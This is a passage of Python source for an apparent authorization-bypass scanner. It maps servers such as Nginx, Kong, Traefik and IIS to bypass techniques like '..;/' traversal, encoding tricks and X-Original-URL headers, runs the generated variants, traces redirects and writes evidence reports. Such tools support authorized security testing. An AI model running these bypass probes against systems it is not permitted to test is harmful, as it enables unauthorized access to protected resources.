     "Nginx 规范化 URI 后再做 location 匹配，与后端容器的解析差异是 proxy_pass 绕过根源"),
    ("Kong Gateway",
     re.compile(r"(?i)x-kong-|server:\s*kong\b|\bkong/\d"),
     None,
     "响应头", ["借道前缀", "目录穿越", "..;/ 穿越", "编码解码", "路径规范化", "段变异"],
     "Kong 路由按原始未解码 URI 匹配且默认不规范化路径，与后端解码/规范化行为差异是前缀绕过主根源"),
    ("Apache APISIX",
     re.compile(r"(?i)\bapisix\b"),
     None,
     "响应头", ["借道前缀", "编码解码", "路径规范化", "斜杠", "段变异"],
     "APISIX radixtree 路由保留原始 URI，normalize 行为随配置变化，与 upstream 解析易出偏差"),
    ("Traefik",
     re.compile(r"(?i)\btraefik\b"),
     None,
     "响应头", ["借道前缀", "路径规范化", "斜杠", "编码解码"],
     "Traefik PathPrefix 规则默认不规范化路径，StripPrefix/ReplacePath 中间件与后端解析差异是绕过面"),
    ("Apache HTTPD",
     re.compile(r"(?i)\bapache(?![- ]tomcat)[/ ]\d"),
     None,
     "Server头", ["路径规范化", "编码解码"],
     "httpd 对 %2F 与合并斜杠的行为随 AllowEncodedSlashes/MergeSlashes 配置变化"),
    ("IIS/ASP.NET",
     re.compile(r"(?i)\biis\b|asp\.net|x-aspnet"),
     None,
     "响应头", ["DotNet", "路径规范化", "编码解码", "段大小写"],
     "IIS 与 ASP.NET 管道双层解析，%u 编码、短文件名、::$DATA 均为差异点；"
     "Windows 文件系统大小写不敏感，是大小写路由绕过的高发环境"),
    ("Node/Express",
     re.compile(r"(?i)x-powered-by:\s*express"),
     None,
     "响应头", ["NodeJs", "路径规范化", "尾缀差异"],
     "Express 路由不做路径规范化，鉴权中间件若自行 normalize 则产生差异"),
]

PROXY_TRACE_HEADERS = ("via", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
                       "x-real-ip", "cf-ray", "x-varnish", "x-cache", "x-served-by",
                       "true-client-ip")


def fingerprint_framework(base_low, base_high=None, base_err=None):
    """v3.2 [需求8] 从基线响应指纹识别框架/中间件/反代痕迹。
    返回 [{名称, 证据, 推荐类别, 说明}]，无命中返回 []。"""
    if not base_low or base_low.get("error"):
        return []
    headers = base_low.get("headers", {}) or {}
    header_blob = f"{base_low.get('server', '')} " + " ".join(f"{k}:{v}" for k, v in headers.items())
    body_text = visible_text(base_low.get("body", ""))
    if base_err and not base_err.get("error"):
        body_text += " " + visible_text(base_err.get("body", ""))

    found = []
    for name, hpat, bpat, ev, recs, note in FRAMEWORK_SIGNATURES:
        hit_ev = None
        if hpat and hpat.search(header_blob[:6000]):
            hit_ev = ev
        elif bpat and bpat.search(body_text[:8000]):
            hit_ev = ev
        if hit_ev:
            found.append({"名称": name, "证据": hit_ev, "推荐类别": recs, "说明": note})

    # 反向代理/CDN 痕迹——决定是否值得启用请求头重写探测（需求7：环境特征探测）
    proxy_keys = [k for k in headers if k.lower() in PROXY_TRACE_HEADERS]
    if proxy_keys:
        found.append({"名称": "反向代理/CDN 痕迹",
                      "证据": "响应头: " + ", ".join(sorted(set(proxy_keys))[:5]),
                      "推荐类别": ["请求头重写", "路径规范化", "编码解码"],
                      "说明": "存在代理/CDN 层，X-Original-URL/Forwarded 等改写头值得探测"})

    # Java Servlet 表单登录启发（302 登录页 + JSESSIONID）
    if "jsessionid" in header_blob.lower() and base_low.get("code") in REDIRECT_CODES \
            and is_login_redirect(base_low.get("location", "")):
        found.append({"名称": "Java Servlet 表单登录(疑似)",
                      "证据": "JSESSIONID + 302 登录页",
                      "推荐类别": ["分号参数", "路径规范化", "尾缀差异", "编码解码", "分号后缀"],
                      "说明": "典型 Java Web 表单认证，重点测分号/编码/尾缀差异"})
    return found


def recommended_categories(fps):
    """v3.2: 汇总指纹推荐的类别（保序去重）"""
    seen, out = set(), []
    for f in fps or []:
        for cat in f.get("推荐类别", []):
            if cat not in seen:
                seen.add(cat)
                out.append(cat)
    return out


def method_label(v):
    """v3.2: HTTP 方法矩阵行标签——方法 + 方法覆盖头/参数污染标识
    v3.8: 识别 X-HTTP-Override 头与 JSON 体注入的 _method"""
    label = v["method"]
    for k in v.get("headers", {}):
        if "method-override" in k.lower() or k.lower() in ("x-original-method", "x-http-method", "x-http-override"):
            label += f" +{k}"
    if v.get("body") and ("_method=" in v["body"] or '"_method"' in v["body"]):
        label += " +body"
    return label


def method_matrix_summary(rows):
    """v3.2 [需求5] 同一路径不同方法的矩阵——GET 受限但其它方法行为不同的疑点"""
    out = []
    for r in rows:
        v = r["variant"]
        if v["cat"] != "HTTP方法":
            continue
        out.append({"方法": method_label(v), "状态码": r["resp"]["code"],
                    "判定": r["verdict"] or "-", "备注": r["note"] or ""})
    return out


async def trace_redirect_chain(manager, url, method, extra_headers=None, kind="low",
                               body=None, max_hops=5, use_absolute=False):
    """v3.2 [需求6] 手动多级重定向追踪（allow_redirects=False 逐跳请求），
    带循环检测。返回 [{url, code, location, resp}]，最后一项为最终落点。
    v3.4 [P3]: RFC 7231 语义——303 响应后按 GET 重发并丢弃请求体，对齐浏览器行为。"""
    hops = []
    current = url
    seen = {url.split("?", 1)[0]}
    for _ in range(max_hops):
        r = await manager.send(current, method, extra_headers, kind=kind, body=body,
                               use_absolute=use_absolute)
        hops.append({"url": current, "code": r["code"], "location": r.get("location", ""), "resp": r})
        if r["error"] or r["code"] not in REDIRECT_CODES or not r.get("location"):
            break
        nxt = urljoin(current, r["location"])
        p = nxt.split("?", 1)[0]
        if p in seen:
            hops.append({"url": nxt, "code": "LOOP", "location": "", "resp": None})
            break
        seen.add(p)
        current = nxt
        if r["code"] == 303 and method != "GET":
            method, body = "GET", None
        elif r["code"] in (301, 302) and method == "POST":
            # v3.8: 对齐浏览器历史行为——301/302 对 POST 亦按 GET 重发并丢弃请求体
            method, body = "GET", None
    return hops


def analyze_redirect_row(row, chain, base_chain, base_low, base_high, threshold):
    """v3.2 [需求6] 重定向链联合判定：
    - 多级重定向追踪（最多 5 跳 + 循环检测）
    - 最终落点与基线跳转链落点对比（相对路径偏移导致的鉴权偏差）
    - Location 与最终响应正文联合判断（落点 2xx 且内容与基线差异显著 → 升级 ★）"""
    row["redirect_chain"] = [{"码": h["code"], "URL": h["url"], "Location": h.get("location", "")}
                             for h in chain]
    last = chain[-1]
    final = last.get("resp")
    row["redirect_final"] = {"状态码": last["code"], "落点": last["url"],
                             "落点路径": urlparse(last["url"]).path}
    notes = [f"{len(chain)}跳"]
    if any(h["code"] == "LOOP" for h in chain):
        notes.append("检测到跳转循环")
    # v3.4 [P3] 跨域提示：跳转链离开目标域时，测试凭据已被携带发送到第三方
    init_host = urlparse(chain[0]["url"]).netloc
    ext_hosts = {urlparse(h["url"]).netloc for h in chain if h.get("url")} - {init_host}
    if ext_hosts:
        notes.append(f"⚠跳转跨域({', '.join(sorted(ext_hosts)[:2])})，已携带测试凭据")

    base_last = base_chain[-1] if base_chain else None
    base_landing = urlparse(base_last["url"]).path if base_last else ""

    verdict, conf = row["verdict"], row.get("confidence", "-")
    if final and not final.get("error"):
        if final["code"] in OK_CODES and final["length"] > 0:
            if base_high and base_high["code"] in OK_CODES:
                sim = content_similarity(final["body"], final["ctype"],
                                         base_high["body"], base_high["ctype"])
                if sim >= AUTH_SIM_THRESHOLD:
                    verdict, conf = "★疑似绕过", "高"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与高权限内容相似度{sim:.2f}")
                else:
                    notes.append(f"落点2xx但与高权限相似度仅{sim:.2f}")
            else:
                sim_base = content_similarity(final["body"], final["ctype"],
                                              base_low["body"], base_low["ctype"])
                if sim_base < threshold:
                    verdict = "★疑似绕过"
                    conf = conf if conf in ("高", "中") else "中"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与基线内容相似度仅{sim_base:.2f}")
                else:
                    notes.append(f"落点2xx但内容与基线相似({sim_base:.2f})，疑同页")
        else:
            landing = row["redirect_final"]["落点路径"]
            if base_landing and landing and landing != base_landing:
                notes.append(f"落点路径与基线链落点不同: {landing} vs {base_landing}")
            if final.get("code") in DENY_LIKE:
                notes.append("落点仍被拒")
    row["verdict"], row["confidence"] = verdict, conf
    row["note"] = (row["note"] + "；" if row["note"] else "") + "重定向追踪: " + "，".join(notes)
    return row


async def run_fingerprint_only(spec, args, manager):
    """v3.2 [需求8] --fingerprint-only：仅建立基线并输出框架指纹与类别推荐
    v3.8: 接收 TargetSpec，注入目标级上下文并按基础方法/请求体采样基线"""
    target = spec.url
    manager.low_cookie = spec.cookie or manager.cli_low_cookie
    manager.extra_headers = {**manager.cli_extra_headers, **(spec.headers or {})}
    print("\n" + c_head("=" * 78))
    print(c_head(f" 框架指纹识别: {target}"))
    print(c_head("=" * 78))
    base_body = spec.body or None
    base_low, _, _, _ = await get_baseline_adaptive(target, manager, "low", "低权限基线  ",
                                                    method=spec.method, body=base_body)
    base_high = None
    if args.high_cookie:
        base_high, _, _, _ = await get_baseline_adaptive(target, manager, "high", "高权限基线  ",
                                                         method=spec.method, body=base_body)
    prefix = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    base_err, _ = await get_error_baseline(prefix, manager, method=spec.method, body=base_body)

    fps = fingerprint_framework(base_low, base_high, base_err)
    print(c_info("\n[*] 框架指纹结果:"))
    if fps:
        for fw in fps:
            print(c_ok(f"    - {fw['名称']}") + c_dim(f"  (证据: {fw['证据']})"))
            print(f"      推荐类别: {c_info(', '.join(fw['推荐类别']))}")
            if fw.get("说明"):
                print(c_dim(f"      说明: {fw['说明']}"))
        recs = recommended_categories(fps)
        print(c_info(f"\n[*] 汇总推荐类别: {', '.join(recs) if recs else '(无，建议全类别)'}"))
        print(c_info(f"[*] 后续测试建议: 追加 --smart 按上述推荐类别自动筛选变形，减少噪声"))
    else:
        print(c_dim("    未识别出明显框架特征，建议全类别测试（不加 --smart）"))


# ---------------------------------------------------------------------------
# 10. 单目标测试主流程（异步版）
# ---------------------------------------------------------------------------
async def run_target(spec, args, report_prefix, manager):
    target = spec.url
    print("\n" + c_head("=" * 78))
    print(c_head(f" 目标: {target}"))
    if spec.method != "GET" or spec.body or spec.headers:
        print(c_info(f" 基础请求: {spec.method}"
                     + (f" | 请求体 {len(spec.body)}B" if spec.body else "")
                     + (f" | 附加头 {len(spec.headers)} 个" if spec.headers else "")))
    print(c_head("=" * 78))

    # v3.8: 目标级上下文注入——-r 请求文件的 Cookie/请求头优先生效
    #（顺序执行模型下安全；多目标各自注入，勿改为并发共享 manager）
    manager.low_cookie = spec.cookie or manager.cli_low_cookie
    manager.extra_headers = {**manager.cli_extra_headers, **(spec.headers or {})}

    print(c_info("[*] 建立基线..."))
    base_body = spec.body or None
    base_low, _, _, base_rtts = await get_baseline_adaptive(
        target, manager, "low", "低权限基线  ", method=spec.method, body=base_body)
    base_high = None
    if args.high_cookie:
        base_high, _, _, _ = await get_baseline_adaptive(
            target, manager, "high", "高权限基线  ", method=spec.method, body=base_body)

    # 错误页基线
    prefix = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    base_err, err_reason = await get_error_baseline(prefix, manager,
                                                    method=spec.method, body=base_body)
    if base_err:
        print(c_dim(f"    错误页基线  : HTTP {base_err['code']}, 长度 {base_err['length']}（用于排除伪 2xx）"))
    else:
        print(c_rev(f"    错误页基线  : 未建立({err_reason})，错误页过滤降级"))

    if base_low["code"] in OK_CODES:
        print(c_warn("    ⚠ 低权限基线本身就是 2xx：该 URL 可能未受保护，所有变形将跳过判定"))

    # v3.2 [需求8] 框架指纹识别（环境指纹后再决定变形策略，避免盲目全量打增加噪声）
    fps = fingerprint_framework(base_low, base_high, base_err)
    if fps:
        print(c_info("    框架指纹    :"))
        for f in fps:
            print(c_ok(f"      - {f['名称']}")
                  + c_dim(f" (证据: {f['证据']}) -> 推荐: {', '.join(f['推荐类别'])}"))
    else:
        print(c_dim("    框架指纹    : 未识别出明显特征（--smart 将回退全类别）"))

    # 生成变形
    categories = args.categories if hasattr(args, "categories") and args.categories else None
    if getattr(args, "smart", False) and not categories:
        recs = recommended_categories(fps)
        if recs:
            categories = ",".join(recs)
            print(c_info(f"[*] 智能模式：按框架指纹启用 {len(recs)} 个推荐类别（--categories 显式指定时不生效）"))
    exclude = getattr(args, "exclude_variants", None)
    variants = generate_variants(target, categories, exclude,
                                 probe_auth=bool(getattr(args, "probe_auth", False)),
                                 probe_jwt=bool(getattr(args, "probe_jwt", False)),
                                 combine=bool(getattr(args, "combine", False)),
                                 combine_cap=getattr(args, "combine_cap", 250) or 250,
                                 borrow_prefixes=getattr(args, "borrow_prefix", None),
                                 prefix_methods=bool(getattr(args, "prefix_methods", False)),
                                 base_method=spec.method, base_body=base_body,
                                 base_headers=spec.headers)
    if getattr(args, "borrow_prefix", None):
        print(c_info(f"[*] --borrow-prefix 生效: {', '.join(args.borrow_prefix)}（根级前置 + 段内还原借道变形已并入）"))
    total_generated = len(variants)
    if args.max_variants and len(variants) > args.max_variants:
        # v3.4 [P3]: 轮转截取，避免按注册顺序截断系统性丢弃后排类别
        variants = round_robin_slice(variants, args.max_variants)
        print(c_rev(f"[!] --max-variants 生效：按类别轮转截取 {len(variants)}/{total_generated} 个变形"))

    print(c_info(f"\n[*] 共生成 {len(variants)} 个变形（已去重），开始测试 "
                 f"(并发 {args.threads}, 间隔 {args.delay}s, 抖动 {args.jitter})...\n"))
    print(c_head(pad("#", 8) + pad("类别", 12) + pad("方法", 8) + pad("状态", 7) + pad("长度", 9)
                 + pad("判定", 18) + "说明 / 备注"))
    print(c_dim("-" * 106))

    # 异步并发执行
    semaphore = asyncio.Semaphore(max(1, args.threads))
    breaker = {"active": False, "streak": 0}

    async def work(v):
        if breaker["active"]:
            return {"variant": v,
                    "resp": {"code": -1, "length": 0, "body": "", "truncated": False,
                             "location": "", "ctype": "", "server": "", "cache_status": "",
                             "age": "", "headers": {}, "rtt": 0, "error": "aborted",
                             "sent_url": v["url"], "rewritten": False},
                    "verdict": "", "note": "已熔断跳过", "confidence": "-"}

        async with semaphore:
            resp = await manager.send(v["url"], v["method"], v["headers"], kind="low",
                                      body=v.get("body"), use_absolute=bool(v.get("use_absolute")))

        if resp["error"]:
            breaker["streak"] += 1
            if args.abort_after and breaker["streak"] >= args.abort_after:
                breaker["active"] = True
        else:
            breaker["streak"] = 0

        manager.stats["planned"] += 1  # v4.5: 计划发送计数
        verdict, note, conf = evaluate(resp, v["method"], base_low, base_high, base_err,
                                       args.threshold, base_rtts)
        return {"variant": v, "resp": resp, "verdict": verdict, "note": note, "confidence": conf}

    rows = []
    total = len(variants)
    done = 0
    num_w = len(str(total)) * 2 + 3  # 进度列宽
    tasks = [asyncio.create_task(work(v)) for v in variants]
    for coro in asyncio.as_completed(tasks):
        row = await coro
        rows.append(row)
        done += 1
        # v3.4 [G7] 基线健康检查：周期性静默复查，会话过期/目标状态漂移即熔断，
        # 避免后续变形全部按失效会话判定产生系统性噪声或漏判
        if getattr(args, "baseline_check", 0) and done % args.baseline_check == 0 \
                and not breaker["active"]:
            chk = await manager.send(target, spec.method, kind="low", body=base_body)
            if chk["error"] or chk["code"] != base_low["code"]:
                breaker["active"] = True
                print(c_warn(f"\n[!] 基线状态漂移(当前 HTTP {chk['error'] or chk['code']}"
                             f" vs 基线 {base_low['code']})，疑似会话过期或目标变化，已熔断后续变形"))
        r, v = row["resp"], row["variant"]
        if r["error"] == "aborted":
            continue
        status = str(r["code"]) if (not r["error"] and r.get("send_status", "ok") == "ok") else "ERR"
        verdict = row["verdict"] or "-"
        if row["verdict"] == "★疑似绕过":
            verdict = f"★疑似绕过[{row['confidence']}]"
        # v3.1: 进度计数前缀 [当前/总数]
        line = (pad(f"[{done}/{total}]", num_w) + pad(v["cat"], 12) + pad(v["method"], 8)
                + pad(status, 7) + pad(str(r["length"]), 9) + pad(verdict, 18) + v["desc"])
        if row["note"] and row["verdict"]:
            line += f"  ({row['note']})"
        # v3.9: 按判定分级着色——★亮红 / △黄 / ✕暗灰；未命中保持默认色降低噪声
        style = verdict_style(row["verdict"])
        print(style(line) if style else line)

    if breaker["active"]:
        print(c_warn(f"\n[!] 连续 {args.abort_after} 次请求失败，已熔断剩余变形（可能触发 WAF/目标不可达）"))

    # v3.2 [需求5] HTTP 方法矩阵——同一路径不同方法对比，方法级鉴权不一致疑点
    matrix = method_matrix_summary(rows)
    if matrix:
        print(c_info(f"\n[*] HTTP 方法矩阵：{len(matrix)} 个方法样本（同一路径）"))
        for m in matrix:
            flag = " ⚠2xx" if m["状态码"] in OK_CODES else ""
            mline = f"    {pad(m['方法'], 34)} HTTP {m['状态码']}{flag}  {m['判定']}"
            # v3.9: 基线被拒却拿到 2xx 的方法级疑点标黄，其余淡化
            print(c_rev(mline) if m["状态码"] in OK_CODES else c_dim(mline))
        n2xx = sum(1 for m in matrix if m["状态码"] in OK_CODES)
        if n2xx:
            print(c_warn(f"    ⚠ {n2xx} 个方法变形在 {spec.method} 基线被拒时返回 2xx——方法级鉴权不一致疑点"))

    # v3.2 [需求6] 重定向差异分析——多级跳转追踪 + 落点对比 + Location/正文联合判断
    redirect_rows = []
    if getattr(args, "max_redirect_trace", 8) and rows:
        candidates = [r for r in rows
                      if r["resp"].get("code") in REDIRECT_CODES and r["resp"].get("location")
                      and r["resp"]["error"] != "aborted"]
        marked = [r for r in candidates if r["variant"].get("follow")]
        others = [r for r in candidates if not r["variant"].get("follow")]
        selected = (marked + [r for r in others if r["verdict"] == "△需复核"]
                    + [r for r in others if r["verdict"] != "△需复核"])[:args.max_redirect_trace]
        if selected:
            print(c_info(f"\n[*] 重定向差异分析：追踪 {len(selected)} 条跳转链（每链最多 5 跳，含循环检测）..."))
            base_chain = await trace_redirect_chain(manager, target, spec.method, body=base_body)
            for row in selected:
                v = row["variant"]
                chain = await trace_redirect_chain(manager, v["url"], v["method"],
                                                   v["headers"], body=v.get("body"))
                analyze_redirect_row(row, chain, base_chain, base_low, base_high, args.threshold)
                redirect_rows.append(row)
                fin = row["redirect_final"]
                rline = (f"    [{v['cat']}] {v['desc']}"
                         f" -> {len(chain)}跳, 落点 HTTP {fin['状态码']} {fin['落点路径']}"
                         f"  判定: {row['verdict'] or '-'}")
                rstyle = verdict_style(row["verdict"])
                print(rstyle(rline) if rstyle else c_dim(rline))

    hits = [r for r in rows if r["verdict"] == "★疑似绕过"]
    reviews = [r for r in rows if r["verdict"] == "△需复核"]
    errors = [r for r in rows if r["verdict"] == "✕请求失败"]
    dropped = [r for r in rows if r["verdict"] == "✕客户端丢弃"]  # v4.5: 客户端丢弃终态
    aborted = sum(1 for r in rows if r["resp"]["error"] == "aborted")

    # ---- 二次复核 ----
    if hits and not args.skip_recheck:
        if spec.method != "GET" or spec.body:
            print(c_warn("[!] ⚠ 基础请求为 POST 面（携带方法/请求体），二次复核将重放该请求——"
                         "写接口请确认目标可承受副作用（不可承受可 --skip-recheck）"))
        print(c_info(f"\n[*] 对 {len(hits)} 个 ★ 命中项做二次复核（匿名 + 低权限连测 2 次）..."))
        for row in hits:
            row["verify"], row["confidence"] = await second_verify(row, base_high, manager)
            # v3.9: 复核结论按置信度着色——高=亮红（实锤）、中=黄、低=暗
            conf_c = {"高": c_hit, "中": c_rev}.get(row["confidence"], c_dim)
            print(c_hit(f"    [{row['variant']['cat']}] {row['variant']['url']}") + "\n"
                  + conf_c(f"        -> [{row['confidence']}] {row['verify']}"))

    # ---- 命中聚类 ----
    clusters = cluster_hits(hits) if hits else []
    if clusters and len(clusters) < len(hits):
        print(c_info(f"\n[*] 命中归因：{len(hits)} 个命中项聚类为 {len(clusters)} 个根因"))
        for cl in clusters:
            if cl["count"] > 1:
                print(c_rev(f"    根因 [{cl['representative']['variant']['cat']}] "
                            f"{cl['representative']['variant']['desc']} "
                            f"(同根因 {cl['count']} 个变形)"))

    print(c_dim("-" * 106))
    stat = (c_info(f"[*] 完成：{len(variants)} 个变形") + " | "
            + c_hit(f"★疑似 {len(hits)}") + " | "
            + c_rev(f"△需复核 {len(reviews)}") + " | "
            + c_err(f"请求失败 {len(errors)}"))
    if dropped:  # v4.5: 客户端丢弃计入本目标统计（全局分布见收尾发送统计）
        stat += " | " + c_warn(f"客户端丢弃 {len(dropped)}")
    if aborted:
        stat += " | " + c_warn(f"熔断跳过 {aborted}")
    print(stat)

    # v3.9: 本目标可疑 URL 全量直出——★亮红 / △黄，复制即可手工验证
    if hits or reviews:
        print(c_head("\n── 本目标可疑 URL 清单（复制即可手工验证）──"))
        for i, row in enumerate(hits, 1):
            v = row["variant"]
            print(c_hit(f"  ★ {i:>2}. [{v['method']}] {v['url']}"))
        for i, row in enumerate(reviews, 1):
            v = row["variant"]
            print(c_rev(f"  △ {i:>2}. [{v['method']}] {v['url']}"))

    extra = {
        "fingerprint": fps,
        "method_matrix": matrix,
        "redirect_analysis": [{"手法": r["variant"]["desc"], "类别": r["variant"]["cat"],
                               "链": r["redirect_chain"], "落点": r["redirect_final"],
                               "判定": r["verdict"], "备注": r["note"]} for r in redirect_rows],
        # v3.8: 基础请求与实际生效 Cookie 留痕（-r 输入时 args.low_cookie 可能为空）
        "base_request": {"方法": spec.method, "请求体长度": len(spec.body),
                         "Content-Type": spec.headers.get("Content-Type", ""),
                         "附加头数": len(spec.headers)},
        "low_cookie_used": manager.low_cookie,
    }
    write_reports(report_prefix, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra)
    # v3.9: 命中/复核行一并返回，供 async_main 汇总输出全局可疑 URL 清单
    return len(hits), len(reviews), hits, reviews


# ---------------------------------------------------------------------------
# 11. 报告输出（JSON / CSV / TXT / HTML + 证据 + 聚类）
# ---------------------------------------------------------------------------
def slim(row):
    """报告行：不落地完整响应体，只保留元数据 + 短哈希对证"""
    v, r = row["variant"], row["resp"]
    return {
        "类别": v["cat"], "手法": v["desc"], "方法": v["method"], "URL": v["url"],
        "附加头": v["headers"], "请求体": v.get("body"),
        "状态码": r["code"], "长度": r["length"],
        "截断": ("是" if r.get("truncated") else ""),
        "实际URL": r.get("sent_url", ""),
        "变形失真": ("是" if r.get("rewritten") else ""),
        "Location": r["location"], "Content-Type": r["ctype"],
        "Server": r.get("server", ""), "缓存状态": r.get("cache_status", ""),
        "RTT秒": r["rtt"], "错误": r["error"],
        "判定": row["verdict"] or "-",
        "置信度": row.get("confidence", "-"),
        "响应SHA256": sha16(r["body"]),
        "备注": row["note"],
        # v3.2: 重定向链分析结果
        **({"重定向落点": row["redirect_final"]} if row.get("redirect_final") else {}),
        **({"重定向链": " -> ".join(str(h["码"]) for h in row["redirect_chain"])}
           if row.get("redirect_chain") else {}),
        **({"复核结论": row["verify"]} if row.get("verify") else {}),
        **({"证据文件": row["evidence"]} if row.get("evidence") else {}),
        **({"同根因变形": row.get("same_root")} if row.get("same_root") else {}),
    }


def save_evidence(dir_path, hits, redact=False):
    """★ 命中项证据留存——请求信息 + 响应前 2000 字符 + SHA256
    v3.4 [P0-1]: 记录实际发送 URL（客户端重写时显式标注）
    v3.4 [P3]: redact=True 时对手机号/身份证/邮箱/银行卡脱敏后落盘"""
    os.makedirs(dir_path, exist_ok=True)
    for i, row in enumerate(hits, 1):
        v, r = row["variant"], row["resp"]
        fp = os.path.join(dir_path, f"hit_{i:02d}.txt")
        with open(fp, "w", encoding="utf-8", errors="replace") as f:
            f.write(f"URL: {v['url']}\n方法: {v['method']}\n附加头: {json.dumps(v['headers'], ensure_ascii=False)}\n")
            if r.get("rewritten"):
                f.write(f"⚠ 实际发送URL(客户端重写): {r.get('sent_url', '')}\n")
            if v.get("body"):
                f.write(f"请求体: {v['body']}\n")
            f.write(f"状态码: {r['code']}\nContent-Type: {r['ctype']}\nLocation: {r['location'] or '-'}\n")
            f.write(f"Server: {r.get('server', '-')}\n缓存状态: {r.get('cache_status', '-')}\n")
            f.write(f"截断: {'是' if r.get('truncated') else '否'}\n")
            f.write(f"响应SHA256: {sha16(r['body'])}\n复核: {row.get('verify', '-')}\n")
            f.write("--- 响应体(前2000字符" + ("，已脱敏" if redact else "") + ") ---\n")
            body = (r["body"] or "")[:2000]
            f.write((redact_text(body) if redact else body) + "\n")
        row["evidence"] = fp


def write_reports(prefix, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra=None):
    extra = extra or {}
    ts = time.strftime("%Y%m%d_%H%M%S")
    host = urlparse(target).netloc.replace(":", "_").replace(".", "_")
    base_name = f"{prefix}_{host}_{ts}"

    if hits and not args.no_evidence:
        save_evidence(base_name + "_evidence", hits,
                      redact=bool(getattr(args, "redact_evidence", False)))

    meta = {
        "目标": target, "时间": ts, "工具版本": VERSION,
        "基础请求": extra.get("base_request"),
        "低权限Cookie(脱敏)": mask_cookie(extra.get("low_cookie_used") or args.low_cookie),
        "低权限基线": {"状态码": base_low["code"], "长度": base_low["length"], "Location": base_low["location"]},
        "高权限基线": ({"状态码": base_high["code"], "长度": base_high["length"]} if base_high else None),
        "错误页基线": ({"状态码": base_err["code"], "长度": base_err["length"]} if base_err else None),
        "框架指纹": extra.get("fingerprint") or [],
        "HTTP方法矩阵": extra.get("method_matrix") or [],
        "重定向链分析": extra.get("redirect_analysis") or [],
        "统计": {
            "变形总数": len(rows), "疑似绕过": len(hits),
            "需复核": len(reviews),
            "请求失败": sum(1 for r in rows if r["verdict"] == "✕请求失败"),
            "客户端丢弃": sum(1 for r in rows if r["verdict"] == "✕客户端丢弃"),
            "熔断跳过": sum(1 for r in rows if r["resp"]["error"] == "aborted"),
            "聚类根因数": len(clusters),
        },
    }

    interesting = [r for r in rows if r["verdict"]]
    with open(base_name + ".json", "w", encoding="utf-8") as f:
        json.dump({**meta, "命中与复核项": [slim(r) for r in interesting],
                   "聚类归因": [{"根因": cl["representative"]["variant"]["desc"],
                                "同根因数": cl["count"],
                                "同根因变形": cl["same_root"]} for cl in clusters if cl["count"] > 1]},
                  f, ensure_ascii=False, indent=2)

    with open(base_name + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        cols = ["类别", "手法", "方法", "URL", "实际URL", "变形失真", "状态码", "长度", "截断",
                "Location", "RTT秒", "Server", "缓存状态", "判定", "置信度", "响应SHA256",
                "重定向落点", "重定向链", "备注", "复核结论", "同根因变形", "证据文件"]
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in interesting:
            w.writerow(slim(r))

    # v3.4 [P3] JSONL 流式输出：全量判定逐行落盘，CI/SIEM 可直接消费
    if getattr(args, "jsonl", False):
        with open(base_name + ".jsonl", "w", encoding="utf-8") as f:
            meta_lite = {"目标": target, "时间": ts, "工具版本": VERSION}
            for r in rows:
                s = slim(r)
                s.pop("附加头", None)
                s.pop("请求体", None)
                s.update(meta_lite)
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

    with open(base_name + ".txt", "w", encoding="utf-8") as f:
        f.write(f"目标: {target}\n时间: {ts}\n")
        br = extra.get("base_request")
        if br:
            f.write(f"基础请求: {br['方法']}"
                    + (f" | 请求体 {br['请求体长度']}B" if br.get("请求体长度") else "")
                    + (f" | Content-Type: {br['Content-Type']}" if br.get("Content-Type") else "")
                    + (f" | 附加头 {br['附加头数']} 个" if br.get("附加头数") else "")
                    + "\n")
        f.write(f"低权限基线: HTTP {base_low['code']} (len={base_low['length']}, Location={base_low['location'] or '-'})\n")
        if base_high:
            f.write(f"高权限基线: HTTP {base_high['code']} (len={base_high['length']})\n")
        if base_err:
            f.write(f"错误页基线: HTTP {base_err['code']} (len={base_err['length']})\n")
        f.write(f"低权限Cookie(脱敏): {mask_cookie(extra.get('low_cookie_used') or args.low_cookie) or '(无)'}\n\n")
        if extra.get("fingerprint"):
            f.write("框架指纹: " + "; ".join(f"{fw['名称']}({fw['证据']})" for fw in extra["fingerprint"]) + "\n")
            recs = recommended_categories(extra["fingerprint"])
            if recs:
                f.write("推荐类别: " + ", ".join(recs) + "\n")
        f.write(f"\n=== ★ 疑似绕过 ({len(hits)}) ===\n")
        for r in hits:
            s = slim(r)
            f.write(f"[{s['类别']}] {s['方法']} HTTP {s['状态码']} len={s['长度']} "
                    f"置信度={s['置信度']} sha256={s['响应SHA256']} | {s['手法']}\n"
                    f"    {s['URL']}\n    备注: {s['备注']}"
                    + (f"\n    复核: {s['复核结论']}" if s.get("复核结论") else "")
                    + (f"\n    证据: {s['证据文件']}" if s.get("证据文件") else "")
                    + "\n")
        f.write(f"\n=== △ 需人工复核 ({len(reviews)}) ===\n")
        for r in reviews:
            s = slim(r)
            f.write(f"[{s['类别']}] {s['方法']} HTTP {s['状态码']} len={s['长度']} | {s['手法']} | {s['备注']}\n    {s['URL']}\n")

        # v3.2: 方法级鉴权疑点
        if extra.get("method_matrix"):
            m2xx = [m for m in extra["method_matrix"] if m["状态码"] in OK_CODES]
            if m2xx:
                f.write(f"\n=== 方法级鉴权疑点: {len(m2xx)} 个方法变形返回 2xx ===\n")
                for m in m2xx:
                    f.write(f"    {m['方法']} -> HTTP {m['状态码']} {m['判定']} {m['备注']}\n")

        # v3.2: 重定向链分析
        if extra.get("redirect_analysis"):
            f.write(f"\n=== 重定向链分析 ({len(extra['redirect_analysis'])}) ===\n")
            for a in extra["redirect_analysis"]:
                f.write(f"[{a['类别']}] {a['手法']} | {len(a['链'])}跳"
                        f" 落点HTTP {a['落点']['状态码']} {a['落点']['落点路径']} | {a['判定'] or '-'}\n")

    generate_html_report(base_name, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra)

    print(c_ok(f"[*] 报告已保存: {base_name}.txt / .json / .csv / .html"
               + (f" | 证据目录: {base_name}_evidence/" if hits and not args.no_evidence else "")))


# ---------------------------------------------------------------------------
# 12. HTML 可视化报告（含 diff 视图 + 覆盖率 + 聚类）
# ---------------------------------------------------------------------------
def generate_html_report(base_name, target, base_low, base_high, base_err, rows, hits, reviews, clusters, args, extra=None):
